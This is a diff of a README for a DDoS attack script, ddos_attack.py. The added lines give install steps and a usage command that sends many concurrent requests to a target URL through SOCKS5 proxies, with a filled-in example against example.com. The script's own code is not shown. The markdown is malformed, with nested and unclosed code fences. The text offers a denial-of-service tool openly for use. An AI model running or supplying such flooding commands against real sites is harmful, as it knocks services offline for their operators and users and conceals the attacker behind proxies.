@@ -22,4 +22,23 @@ In addition to the ability to control various attack parameters, the script also
   ```bash
   pip install aiohttp aiohttp_socks
 
-  helloooo
+  ```bash
+
+  python3 ddos_attack.py <url> <num_tasks> --rate_limit <rate_limit> --method <method> --headers <headers> --data <data> --proxies <proxies>
+
+Example:
+
+```bash
+
+
+python3 ddos_attack.py http://example.com 100 --rate_limit 0.5 --method POST --headers '{"Content-Type": "application/json"}' --data '{"key":"value"}' --proxies '["socks5://proxy1", "socks5://proxy2"]'
+
+
+
+
+
+
+
+
+
+
